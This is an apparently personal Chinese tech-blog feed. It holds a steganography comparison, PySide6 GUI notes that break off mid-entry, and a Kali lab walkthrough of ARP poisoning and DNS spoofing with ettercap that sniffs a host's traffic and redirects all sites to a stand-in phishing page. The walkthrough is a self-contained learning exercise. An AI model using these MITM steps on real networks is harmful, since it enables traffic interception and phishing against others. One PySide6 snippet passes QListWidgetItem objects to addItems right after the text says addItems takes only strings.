title="image-20240326143411235"><p>算法实现成功</p><p>接下来我们使用隐写分析比较普通LSB算法、随机LSB替换算法和LSBM算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">img_steg_lsb_random , _ =hide_message_in_image_random(ori_path, binary=binary_full)</span><br><span class="line">img_steg_lsb_random = img_steg_lsb_random.reshape((img_ori.shape[<span class="number">0</span>], img_ori.shape[<span class="number">1</span>]))</span><br><span class="line">img_steg_lsbm , _ = LSBM(ori_path, binary=binary_full)</span><br><span class="line">img_steg_lsbm = img_steg_lsbm.reshape((img_ori.shape[<span class="number">0</span>], img_ori.shape[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hist_random = cv2.calcHist([img_steg_lsb_random], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>]).flatten()</span><br><span class="line">hist_lsbm = cv2.calcHist([img_steg_lsbm], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>]).flatten()</span><br><span class="line"></span><br><span class="line">r_random, p_random = calculate_r_and_p(hist_random )</span><br><span class="line">r_lsbm, p_lsbm = calculate_r_and_p(hist_lsbm )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;普通LSB算法的r值: <span class="subst">&#123;r_full&#125;</span>, P值: <span class="subst">&#123;p_full&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;随机LSB替换算法的r值: <span class="subst">&#123;r_random&#125;</span>, P值: <span class="subst">&#123;p_random&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;LSBM算法的r值: <span class="subst">&#123;r_lsbm&#125;</span>, P值: <span class="subst">&#123;p_lsbm&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果如下</p><img src="/posts/55270c628aa8/image-20240326143506448.png" class="" title="image-20240326143506448"><p>可以看到，相较于普通LSB算法的r值，两种改进算法都有提高</p><p>而两种改进算法的p值也成功降低，<strong>说明这两种改进方法都能在一定程度上对抗隐写分析</strong></p><p>相较而言，LSBM算法的效果要比随机LSB替换算法更好</p>]]></content>
      
      
      
        <tags>
            
            <tag> 多媒体安全 </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali arp欺骗嗅探局域网中数据包</title>
      <link href="/posts/b8b1b0234de6/"/>
      <url>/posts/b8b1b0234de6/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>arp协议即地址解析协议，用于将IP地址解析为以太网MAC地址</p><p>ARP攻击的原理，主要是ARP协议自身设计的缺陷，在主机收到arp应答时，不管以前是否发出请求，都会接收并更新arp缓存，这就可以导致虚假的arp应答</p><p>当然ARP攻击的过程也属于中间人攻击，攻击者充当中间人，以服务器的身份欺骗靶机，以PC机身份欺骗服务器，从而实现劫持服务器与靶机间会话信息、钓鱼等攻击目标</p><h2 id="将kali虚拟机桥接到主机"><a href="#将kali虚拟机桥接到主机" class="headerlink" title="将kali虚拟机桥接到主机"></a>将kali虚拟机桥接到主机</h2><p>进入网络和Internet设置，点击<strong>网络和共享中心</strong></p><img src="/posts/b8b1b0234de6/image-20240311130437228.webp" class="" title="image-20240311130437228"><p>点击正在连接的WIFI（这里使用手机流量开的热点，校园网容易扫到不该扫的东西）</p><img src="/posts/b8b1b0234de6/image-20240312192857980.webp" class="" title="image-20240312192857980"><p>点击<strong>详细信息</strong>，获取使用的网卡信息</p><img src="/posts/b8b1b0234de6/image-20240311130649966.webp" class="" title="image-20240311130649966"><p>打开VMware，进入编辑栏下的虚拟网络编辑器，选择更改设置</p><img src="/posts/b8b1b0234de6/image-20240311131130359.webp" class="" title="image-20240311131130359"><p>将桥接对象改为刚刚获取的网卡</p><img src="/posts/b8b1b0234de6/image-20240311131212118.webp" class="" title="image-20240311131212118"><p>修改kali虚拟机的网络连接设置，将其改为桥接模式</p><img src="/posts/b8b1b0234de6/image-20240311131328277.webp" class="" title="image-20240311131328277"><p>接下来启动虚拟机，在shell中执行如下指令，修改kali的网络配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/network</span><br><span class="line">vim interfaces</span><br></pre></td></tr></table></figure><h2 id="配置并启动SSH服务"><a href="#配置并启动SSH服务" class="headerlink" title="配置并启动SSH服务"></a>配置并启动SSH服务</h2><p>终端输入如下指令打开kali虚拟机上的ssh配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>将#PasswordAuthentication yes的注释去掉</p><img src="/posts/b8b1b0234de6/image-20240311233341846.webp" class="" title="image-20240311233341846"><p>将PermitRootLogin项的值修改为yes，并将注释符号去掉</p><img src="/posts/b8b1b0234de6/image-20240311234049033.webp" class="" title="image-20240311234049033"><p>设置完毕后执行<code>:wq</code>保存并退出</p><h2 id="配置ettercap"><a href="#配置ettercap" class="headerlink" title="配置ettercap"></a>配置ettercap</h2><p>执行<code>vim /etc/ettercap/etter.conf</code> </p><p>找到文件中的linux字串，将下面两行开头的#去掉</p><img src="/posts/b8b1b0234de6/image-20240312005419867.webp" class="" title="image-20240312005419867"><p>执行<code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code>，用于启用IP转发功能</p><p>启用IP转发后，系统可以将接收到的数据包转发给另一个网络接口，允许不同网络之间的通信。</p><h2 id="扫描局域网内存活的主机"><a href="#扫描局域网内存活的主机" class="headerlink" title="扫描局域网内存活的主机"></a>扫描局域网内存活的主机</h2><p>在终端中执行<code>sudo ettercap -G</code>，打开图形化界面</p><p>需要注意<strong>这一步一定要有root账户的权限</strong>，否则该软件将无法启动</p><p>在<code>Primary Interface</code>栏选择桥接到的宿主机使用的网络，然后点击右上角的确认按钮</p><img src="/posts/b8b1b0234de6/image-20240312130726857.webp" class="" title="image-20240312130726857"><p>在本机的shell中输入ipconfig，查看本机在内网的ip、掩码和网关</p><img src="/posts/b8b1b0234de6/image-20240312193436178.webp" class="" title="image-20240312193436178"><p>点击位于软件菜单栏最右侧的图标，可以发现自己的主机已经被扫描出来，我们还差扫出一个网关</p><img src="/posts/b8b1b0234de6/image-20240312193623259.webp" class="" title="image-20240312193623259"><p>点击搜索按钮，进入全域扫描的过程</p><img src="/posts/b8b1b0234de6/image-20240312193821992.webp" class="" title="image-20240312193821992"><p>成功扫描出网关<img src="/posts/b8b1b0234de6/image-20240312193924567.webp" class="" title="image-20240312193924567"></p><h2 id="将网关和主机分别加入攻击目标"><a href="#将网关和主机分别加入攻击目标" class="headerlink" title="将网关和主机分别加入攻击目标"></a>将网关和主机分别加入攻击目标</h2><p>点击右上角拓展菜单中的<code>Targets</code>栏，选择查看当前的攻击目标</p><img src="/posts/b8b1b0234de6/image-20240312194200956.webp" class="" title="image-20240312194200956"><img src="/posts/b8b1b0234de6/image-20240312194149511.webp" class="" title="image-20240312194149511"><p>将网关添加到<code>Target2</code>被攻击的主机IP添加到<code>Target1</code></p><img src="/posts/b8b1b0234de6/image-20240312194701964.webp" class="" title="image-20240312194701964"><img src="/posts/b8b1b0234de6/image-20240312194832284.webp" class="" title="image-20240312194832284"><h2 id="执行arp投毒"><a href="#执行arp投毒" class="headerlink" title="执行arp投毒"></a>执行arp投毒</h2><p>点击右上角MIMT攻击栏，点击ARP投毒</p><img src="/posts/b8b1b0234de6/image-20240312194945434.webp" class="" title="image-20240312194945434"><p>勾选上方的<code>Sniff remote connections</code>后点击<code>OK</code></p><img src="/posts/b8b1b0234de6/image-20240312195109067.webp" class="" title="image-20240312195109067"><p>点击右上角拓展菜单栏的view栏，选择<code>connection</code>，我们即可看到对嗅探结果</p><img src="/posts/b8b1b0234de6/image-20240312195544642.webp" class="" title="image-20240312195544642"><p>我们筛选当前活跃的TCP和UDP数据包</p><img src="/posts/b8b1b0234de6/image-20240312195836604.webp" class="" title="image-20240312195836604"><p>此时在主机上开一个空白浏览器，访问<code>www.csdn.com</code></p><img src="/posts/b8b1b0234de6/image-20240312200045934.webp" class="" title="image-20240312200045934"><p>接着我们就能在嗅探结果中找到从主机发出的udp包，双击该数据包</p><p>我们可以从数据包的数据中发现主机正试图从csdn的图床获取csdn网页的图像等资源</p><img src="/posts/b8b1b0234de6/image-20240312200438404.webp" class="" title="image-20240312200438404"><h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2><p>执行<code>ifconfig</code>查看kali虚拟机在内网的IP地址</p><img src="/posts/b8b1b0234de6/image-20240312203754731.webp" class="" title="image-20240312203754731"><p>执行<code>vim /etc/ettercap/etter.dns</code>打开dns配置文件，将所有网站都重定向到准备好的钓鱼网址（这里用github代替）上</p><img src="/posts/b8b1b0234de6/image-20240312211513538.webp" class="" title="image-20240312211513538"><p>在ettercap软件中选择插件栏</p><img src="/posts/b8b1b0234de6/image-20240312204357205.webp" class="" title="image-20240312204357205"><p>点击<code>Manage Plugins</code>，双击选中<code>dns_spoof</code></p><img src="/posts/b8b1b0234de6/image-20240312204452070.webp" class="" title="image-20240312204452070"><img src="/posts/b8b1b0234de6/image-20240312211319204.webp" class="" title="image-20240312211319204"><p>成功使得主机无法访任意页面都跳转到github页面</p><img src="/posts/b8b1b0234de6/image-20240312211430375.webp" class="" title="image-20240312211430375"><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="echo-write-error"><a href="#echo-write-error" class="headerlink" title="echo : write error"></a>echo : write error</h3><p>执行<code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code>时报错</p><img src="/posts/b8b1b0234de6/image-20240312010451964.webp" class="" title="image-20240312010451964"><p>经过多次测试以及分析报错后发现，原来是因为<strong>实验指导中的指令使用的是中文引号</strong>，应该改为英文引号</p><img src="/posts/b8b1b0234de6/image-20240312010704406.webp" class="" title="image-20240312010704406"><h3 id="Can’t-insert-firewall-redirects"><a href="#Can’t-insert-firewall-redirects" class="headerlink" title="Can’t insert firewall redirects"></a>Can’t insert firewall redirects</h3><p>选择eth0后，出现如下报错</p><img src="/posts/b8b1b0234de6/image-20240312011129677.webp" class="" title="image-20240312011129677"><p>找到github的issue区中的一个类似的问题</p><p><a href="https://github.com/Ettercap/ettercap/issues/1076">Ettercap 和 SSL 嗅探 ·期刊 #1076 ·Ettercap/ettercap (github.com)</a></p><p>解决方法则是修改ettercap的配置文件，将关于IPV6的转发配置也取消注释</p><img src="/posts/b8b1b0234de6/image-20240312011322333.webp" class="" title="image-20240312011322333">]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3 pyside6学习笔记及实践（五）</title>
      <link href="/posts/2df062c9f4f0/"/>
      <url>/posts/2df062c9f4f0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列文章为b站PySide6教程以及官方文档的学习笔记</p><p>原视频传送门如下</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.bilibili.com/video/BV1c84y1N7iL" title="【已完结】PySide6百炼成真，带你系统性入门Qt" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/a0589121b678174899c451c1a47538260e1b6e70.jpg@320w_200h_1c_!web-space-favlist-video.webp" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="【已完结】PySide6百炼成真，带你系统性入门Qt" />              </div>              <div class="flink-item-name">【已完结】PySide6百炼成真，带你系统性入门Qt</div>               <div class="flink-item-desc" title="祝大家百炼成真，早日做出自己心仪的界面">祝大家百炼成真，早日做出自己心仪的界面</div>            </a>          </div></div></div><p>官方文档链接：<a href="https://doc.qt.io/qtforpython-6/">Qt for Python</a></p><h2 id="选项卡-QTabWidget"><a href="#选项卡-QTabWidget" class="headerlink" title="选项卡(QTabWidget)"></a>选项卡(QTabWidget)</h2><h3 id="创建选项卡"><a href="#创建选项卡" class="headerlink" title="创建选项卡"></a>创建选项卡</h3><div class="note info flat"><p><code>QTabWidget</code> 提供了一个管理多个页面的堆栈，每个页面都有自己的选项卡标签。这使得用户可以通过选择不同的选项卡来切换不同的内容页面。</p></div><p>首先我们可以多创建几个<code>QWidget</code>实例，将其作为选项卡中的不同页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">self.tab1 = QWidget()</span><br><span class="line">self.tab1Layout = QVBoxLayout()</span><br><span class="line">self.tab1Layout.addWidget(QPushButton(<span class="string">&#x27;Button1&#x27;</span>))</span><br><span class="line">self.tab1Layout.addWidget(QLabel(<span class="string">&#x27;Label1&#x27;</span>))</span><br><span class="line">self.tab1.setLayout(self.tab1Layout)</span><br><span class="line"></span><br><span class="line">self.tab2 = QWidget()</span><br><span class="line">self.tab2Layout = QVBoxLayout()</span><br><span class="line">self.tab2Layout.addWidget(QPushButton(<span class="string">&#x27;Button2&#x27;</span>))</span><br><span class="line">self.tab2Layout.addWidget(QLabel(<span class="string">&#x27;Label2&#x27;</span>))</span><br><span class="line">self.tab2.setLayout(self.tab2Layout)</span><br><span class="line"></span><br><span class="line">self.tab3 = QWidget()</span><br><span class="line">self.tab3Layout = QVBoxLayout()</span><br><span class="line">self.tab3Layout.addWidget(QPushButton(<span class="string">&#x27;Button3&#x27;</span>))</span><br><span class="line">self.tab3Layout.addWidget(QLabel(<span class="string">&#x27;Label3&#x27;</span>))</span><br><span class="line">self.tab3.setLayout(self.tab3Layout)</span><br></pre></td></tr></table></figure><p>接下来我们创建一个选项卡<code>QTabWidget</code>实例，并使用<code>addTab</code>方法向其中添加页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">self.tab = QTabWidget()</span><br><span class="line">self.tab.addTab(self.tab1, <span class="string">&#x27;Tab1&#x27;</span>)</span><br><span class="line">self.tab.addTab(self.tab2, <span class="string">&#x27;Tab2&#x27;</span>)</span><br><span class="line">self.tab.addTab(self.tab3, <span class="string">&#x27;Tab3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/2df062c9f4f0/2024-02-17-15-52-12.gif" class="" title="2024-02-17-15-52-12"><h3 id="常用属性和方法"><a href="#常用属性和方法" class="headerlink" title="常用属性和方法"></a>常用属性和方法</h3><p>前面创建的选项卡离真实软件中的选项卡样式还有很大差距</p><p>以Vscode中的选项卡为例，它不仅有关闭按钮和上下文菜单，还可以进行拖动</p><p>这需要我们配置选项卡的高级属性和方法</p><img src="/posts/2df062c9f4f0/2024-02-17-15-58-43.gif" class="" title="2024-02-17-15-58-43"><p>我们可以使用<code>setTabsClosable</code>方法为选项卡增加关闭按钮</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.tab.setTabsClosable(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>使用<code>setMovable</code>方法让选项卡能够被拖动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.tab.setMovable(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>此时选项卡就拥有关闭按钮且可拖动了，当然关闭功能还需绑定信号和槽</p><img src="/posts/2df062c9f4f0/2024-02-17-17-11-51.gif" class="" title="2024-02-17-17-11-51"><h3 id="常用信号"><a href="#常用信号" class="headerlink" title="常用信号"></a>常用信号</h3><p><code>tabCloseRequested</code>信号会在我们点击关闭按钮时触发，并返回关闭的选项卡的信号</p><p>我们可以将其与<code>removeTab</code>方法绑定，实现关闭选项卡的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.tab.tabCloseRequested.connect(<span class="keyword">lambda</span> index: self.tab.removeTab(index))</span><br></pre></td></tr></table></figure><p>剩下的三个信号也比较常用，后续在实践中也会用到</p><h2 id="堆叠页面-QStackedWidget"><a href="#堆叠页面-QStackedWidget" class="headerlink" title="堆叠页面(QStackedWidget)"></a>堆叠页面(QStackedWidget)</h2><div class="note info flat"><p><code>QStackedWidget</code> 是一个容器控件，它可以包含多个子控件，但在任何给定时间只显示其中一个子控件。这对于实现向导界面或在同一位置显示不同内容的应用程序非常有用。</p></div><h3 id="创建堆叠容器"><a href="#创建堆叠容器" class="headerlink" title="创建堆叠容器"></a>创建堆叠容器</h3><p>与 <code>QTabWidget</code> 类似，我们可以通过创建多个 <code>QWidget</code> 实例作为不同的页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">self.stack1 = QWidget()</span><br><span class="line">self.stack1Layout = QVBoxLayout()</span><br><span class="line">self.stack1Layout.addWidget(QPushButton(<span class="string">&#x27;Stack Button 1&#x27;</span>))</span><br><span class="line">self.stack1Layout.addWidget(QLabel(<span class="string">&#x27;Stack Label 1&#x27;</span>))</span><br><span class="line">self.stack1.setLayout(self.stack1Layout)</span><br><span class="line"></span><br><span class="line">self.stack2 = QWidget()</span><br><span class="line">self.stack2Layout = QVBoxLayout()</span><br><span class="line">self.stack2Layout.addWidget(QPushButton(<span class="string">&#x27;Stack Button 2&#x27;</span>))</span><br><span class="line">self.stack2Layout.addWidget(QLabel(<span class="string">&#x27;Stack Label 2&#x27;</span>))</span><br><span class="line">self.stack2.setLayout(self.stack2Layout)</span><br><span class="line"></span><br><span class="line">self.stack3 = QWidget()</span><br><span class="line">self.stack3Layout = QVBoxLayout()</span><br><span class="line">self.stack3Layout.addWidget(QPushButton(<span class="string">&#x27;Stack Button 3&#x27;</span>))</span><br><span class="line">self.stack3Layout.addWidget(QLabel(<span class="string">&#x27;Stack Label 3&#x27;</span>))</span><br><span class="line">self.stack3.setLayout(self.stack3Layout)</span><br></pre></td></tr></table></figure><p>使用<code>addWidget</code>方法将页面添加到堆叠容器中。初始情况下，<code>QStackedWidget</code>会显示第一个添加的页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">self.stackedWidget = QStackedWidget()</span><br><span class="line">self.stackedWidget.addWidget(self.stack1)</span><br><span class="line">self.stackedWidget.addWidget(self.stack2)</span><br><span class="line">self.stackedWidget.addWidget(self.stack3)</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/2df062c9f4f0/image-20240219160413767.png" class="" title="image-20240219160413767"><h3 id="切换页面"><a href="#切换页面" class="headerlink" title="切换页面"></a>切换页面</h3><p>可以使用 <code>setCurrentIndex</code> 或 <code>setCurrentWidget</code> 方法来切换 <code>QStackedWidget</code> 中当前显示的页面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.stackedWidget.setCurrentIndex(<span class="number">1</span>)  <span class="comment"># 切换到第二个页面</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">self.stackedWidget.setCurrentWidget(self.stack3)  <span class="comment"># 切换到第三个页面</span></span><br></pre></td></tr></table></figure><p><code>setCurrentIndex</code>传入页面的序号，而<code>setCurrentWidget</code>传入页面的实例名称</p><p><code>QStackedWidget</code> 本身没有提供动画切换页面的功能。但是，我们可以通过结合使用 <code>QPropertyAnimation</code>来实现页面之间的平滑过渡动画。</p><h3 id="过渡动画"><a href="#过渡动画" class="headerlink" title="过渡动画"></a>过渡动画</h3><p>我们新建一个堆叠页面的类，在其中重写<code>setCurrentIndex</code>函数，并加入动画效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnimatedStackedWidget</span>(<span class="title class_ inherited__">QStackedWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, parent=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(parent)</span><br><span class="line">        self.animation = QPropertyAnimation(self, <span class="string">b&quot;geometry&quot;</span>)</span><br><span class="line">        self.animation.setDuration(<span class="number">300</span>)  <span class="comment"># 动画持续时间，单位为毫秒</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setCurrentIndex</span>(<span class="params">self, index</span>):</span><br><span class="line">        self.animation.stop()  <span class="comment"># 停止当前动画</span></span><br><span class="line">        current_widget = self.currentWidget()</span><br><span class="line">        next_widget = self.widget(index)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取堆叠窗口的几何信息</span></span><br><span class="line">        stacked_widget_geometry = self.geometry()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 新页面的起始位置在堆叠窗口的下方</span></span><br><span class="line">        next_widget_start_geometry = QRect(stacked_widget_geometry.x(), stacked_widget_geometry.y() + stacked_widget_geometry.height()/<span class="number">4</span>, stacked_widget_geometry.width(), stacked_widget_geometry.height())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 新页面的结束位置与当前页面相同</span></span><br><span class="line">        next_widget_end_geometry = stacked_widget_geometry</span><br><span class="line"></span><br><span class="line">        next_widget.setGeometry(next_widget_start_geometry)  <span class="comment"># 设置新页面的起始位置</span></span><br><span class="line"></span><br><span class="line">        self.animation.setTargetObject(next_widget)</span><br><span class="line">        self.animation.setStartValue(next_widget_start_geometry)</span><br><span class="line">        self.animation.setEndValue(next_widget_end_geometry)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">super</span>().setCurrentIndex(index)  <span class="comment"># 切换到新页面</span></span><br><span class="line">        self.animation.start()</span><br></pre></td></tr></table></figure><p>这里使用了<code>QtCore</code>中的动画类<code>QPropertyAnimation</code>，并设置为位置动画，即平移</p><p>切换到新页面时会从下往上平移加载</p><p>最后我们在页面中添加几个切换按钮</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    btn = QPushButton(<span class="string">f&quot;Go to page <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    btn.clicked.connect(self.make_switcher(i))</span><br><span class="line">    self.mainLayout.addWidget(btn)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_switcher</span>(<span class="params">self, index</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">switch</span>():</span><br><span class="line">        self.stackedWidget.setCurrentIndex(index)</span><br><span class="line">    <span class="keyword">return</span> switch</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/2df062c9f4f0/2024-02-19-20-47-07.gif" class="" title="2024-02-19-20-47-07"><p>当然我们也可以加一下判断条件，<strong>让动画更丝滑</strong></p><p>比如当新的页面被切换时，动画还没播放完，则停止当前动画</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> note </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3 pyside6学习笔记及实践（四）</title>
      <link href="/posts/1f9a4bfd6ae8/"/>
      <url>/posts/1f9a4bfd6ae8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列文章为b站PySide6教程以及官方文档的学习笔记</p><p>原视频传送门如下</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.bilibili.com/video/BV1c84y1N7iL" title="【已完结】PySide6百炼成真，带你系统性入门Qt" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/a0589121b678174899c451c1a47538260e1b6e70.jpg@320w_200h_1c_!web-space-favlist-video.webp" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="【已完结】PySide6百炼成真，带你系统性入门Qt" />              </div>              <div class="flink-item-name">【已完结】PySide6百炼成真，带你系统性入门Qt</div>               <div class="flink-item-desc" title="祝大家百炼成真，早日做出自己心仪的界面">祝大家百炼成真，早日做出自己心仪的界面</div>            </a>          </div></div></div><p>官方文档链接：<a href="https://doc.qt.io/qtforpython-6/">Qt for Python</a></p><h2 id="列表控件-QListWidget"><a href="#列表控件-QListWidget" class="headerlink" title="列表控件(QListWidget)"></a>列表控件(QListWidget)</h2><p>这里我们下载一个<code>faker</code>库，用于生成人名，模拟列表中的元素</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install faker</span><br></pre></td></tr></table></figure><p>在初始化函数中，我们创建faker库的实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.fake = Faker(locale=<span class="string">&#x27;zh_CN&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h3><p>首先我们需要从<code>QtWidgets</code>中引入<code>QListWidegt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QListWidget</span><br></pre></td></tr></table></figure><p>接下来我们可以创建一个列表控件实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget = QListWidget()</span><br></pre></td></tr></table></figure><h3 id="增删插改查"><a href="#增删插改查" class="headerlink" title="增删插改查"></a>增删插改查</h3><h4 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h4><p>使用<code>addItem</code>方法可以一次向列表中添加一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.addItem(self.fake.name())</span><br></pre></td></tr></table></figure><p><code>addItem</code>方法可以接收字符串参数，也可以接收<code>QListWidgetItem</code>类的实例</p><p>之所以要额外使用<code>QListWidgetItem</code>这种数据类型，是因为它定义了一些便捷的属性和方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QListWidgetItem</span><br><span class="line">self.listWidget.addItem(QListWidgetItem(self.fake.name()))</span><br></pre></td></tr></table></figure><p>当然，逐个添加有时会比较麻烦，我们可以使用<code>addItems</code>方法一次添加多个元素</p><p>不过<code>addItems</code>方法只能传入字符串序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.addItems([QListWidgetItem(self.fake.name()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br></pre></td></tr></table></figure><p>我们传入20个人名，效果如下：</p><img src="/posts/1f9a4bfd6ae8/image-20240214153338491.png" class="" title="image-20240214153338491"><p>可以看到，当列表的元素较多时，右侧会出现滚动条，这也是列表的特性之一</p><h4 id="插入元素"><a href="#插入元素" class="headerlink" 